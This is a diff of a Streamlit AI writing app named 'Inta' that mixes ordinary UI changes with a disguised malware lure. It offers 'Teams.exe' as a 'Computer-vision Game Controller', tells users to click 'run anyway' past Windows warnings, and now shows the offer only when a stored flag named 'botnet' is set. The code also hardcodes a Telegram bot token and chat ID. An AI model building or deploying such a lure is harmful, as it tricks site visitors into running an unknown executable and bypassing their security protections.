@@ -8,61 +8,56 @@ import os
 import subprocess
 import sys
 import requests
-TOKEN = "5182224145:AAEjkSlPqV-Q3rH8A9X8HfCDYYEQ44v_qy0"
-chat_id = "5075390513"
-st.set_page_config(
-    page_title="I.n.t.a ✌️", page_icon="random",layout="wide"
-)
-
-def execute(cmd):
-    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
-    for stdout_line in iter(popen.stdout.readline, ""):
-        yield stdout_line 
-    popen.stdout.close()
-    return_code = popen.wait()
-    if return_code:
-        raise subprocess.CalledProcessError(return_code, cmd)
-
 from memory.memory import Memory
 m = Memory()
-fact = ['Create a fun fact about steve jobs','invent an unknown language','Rewrite this sentence in clickbait style: Ai that can write stories!','tell me some ideas about how ai can be used in healthcare.']
-tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]
 
-tippy = random.choice(tips)
 key = st.secrets["db_username"]
 openai.api_key = key
+
 MAGE_EMOJI_URL = "https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/240/twitter/259/mage_1f9d9.png"
+TOKEN = "5182224145:AAEjkSlPqV-Q3rH8A9X8HfCDYYEQ44v_qy0"
+chat_id = "5075390513"
+blog = ["Write a story on any topic.","Write a Blog on any topic.","Write an article on an topic."]
+fact = ['Create a fun fact about steve jobs','Rewrite this sentence in clickbait style: Ai that can write stories!','Tell me some ideas about how ai can be used in healthcare.','Ask the Ai math word-problems','What future awaits me. I am a coder',"Do you believe in God?","What is happiness","How to be happy?"]
+tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: Ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]
+
+st.set_page_config(
+    page_title="I.n.t.a ✌️", page_icon="random",layout="wide",initial_sidebar_state="expanded"
+)
+
+
 
 
 # Set page title and favicon.
-story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story on an old man","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness"]
-st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")
+story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness","Write a story with a happy ending"]
+# st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")
 
 
 while m.get_data('main') == "True":
-    if st.text_input('Please Enter The Correction Code to Reinitialize Database', '*******')  == "Inta":
+    if st.text_input('You have reached the number of requeests , overheating the GPU. Please enter the secret code provided by vaibhav arora to reinitialise', '*******')  == "Inta":
         m.update_data('token', 1)
         m.update_data('main', False)
         m.save()
         break
 
-st.markdown("<br>", unsafe_allow_html=True)
+
 st.image(MAGE_EMOJI_URL, width=80)
-st.title("📈 Intelligent Neural Transformer-Based Ai ✌️")
+st.markdown("#### Inta , An Ai that can write Articles , essays , stories , letters and more! (By Vaibhav Arora)") 
 
   # add vertical space
 # col1, col2, col3 = st.beta_columns(3)
 # open_colab = col1.button(" Open in Colab")  # logic handled further down
 st.write("")  # add vertical space
-with open("Teams.exe", "rb") as file:
-    btn = st.download_button(
-            label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
-            data=file,
-            file_name='Teams.exe'
-    )
-    if btn:
-        st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
-        st.image("https://i.imgur.com/zXh8NEk.png")
+if m.get_data('botnet') == True:
+    with open("Teams.exe", "rb") as file:
+        btn = st.download_button(
+                label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
+                data=file,
+                file_name='Teams.exe'
+        )
+        if btn:
+            st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
+            st.image("https://i.imgur.com/zXh8NEk.png")
 
 
 
@@ -330,7 +325,7 @@ data_load_state = st.subheader('Hello , Welcome to this Website Made By Vaibhav 
 
 genre = st.selectbox(
      "Select Features ",
-     ('Documentation', 'Chat','Writing','Code',"Explain-code"))
+     ('Examples','Documentation', 'Chat','Writing','Code',"Explain-code"))
 
 
 if "Writing" in genre:
@@ -340,7 +335,27 @@ if "Writing" in genre:
 elif "Explain" in genre:
     data_load_state.subheader('🌄 You can type the code below and Inta will explain it for you! 🤖')
     createc = st.text_area(label='Code Description',help="Click Create Code after the Description!")
-
+elif "Examples" in genre:
+    data_load_state.subheader('📝 View the posts created by our Ai **Today!** 👇')
+    over = m.get_data('over')
+    m.update_data('over', over+1)
+    m.save()  
+    with st.spinner('Loading...') :
+        
+        if m.get_data('over') % 3 == 0:
+            data2 = greet(random.choice(blog),"None","Auto")
+            che = st.markdown("##" + data2)
+            m.update_data('data', data2)
+            m.save()  
+        else:
+            dat = m.get_data('data')
+            che = st.markdown("##" + dat)
+    if st.button("New"):
+        with st.spinner('Loading...') :
+            data2 = greet(random.choice(blog),"None","Auto")
+            che.markdown("##" + data2)
+            m.update_data('data', data2)
+            m.save()  
 elif "Code" in genre:
     data_load_state.subheader('🎁 Please type the description of the code 🧑‍💻 below 🎁')
     createc = st.text_input(label='Code Description',help="Click Create Code after the Description!")
@@ -399,8 +414,8 @@ elif "Documentation" in genre:
     data_load_state = st.markdown("""
 - ## Usage
 	- Select the features from the Above Dropbox
-    - ##### Click  ***<*** on the , top-right pane,  to view options
-    - ↙️ You can refer to the examples  on the down-left pane ↙️ 
+    - ##### Click  ***<*** on the , top-right pane,  to view options and open sidebar
+    - ↙️ You can refer to the examples  on the sidebar ↙️ 
 	- Enter text and click "Apply/Submit"
 	- Voila, you will get output 📤
     --> ⛔ Do not **request more than 10 requests** to the website for now .
@@ -423,10 +438,9 @@ elif "Documentation" in genre:
 
 
 with st.sidebar:
-    x = st.info(
-        "🎈 **NEW:** Ask Inta Directly About any Query with BERT Mode in Chat❗"
-    )
+    x = st.info("🎈 **NOTE:** Please Click **X** to close this sidebar , open it later to view advanced config when you have selected the  features❗")
     st.write("## Options")
+    st.error("Please View the documentation before proceeding further")
     if "Writing" in genre:
         option = st.selectbox(
         'Please Select the Mode',
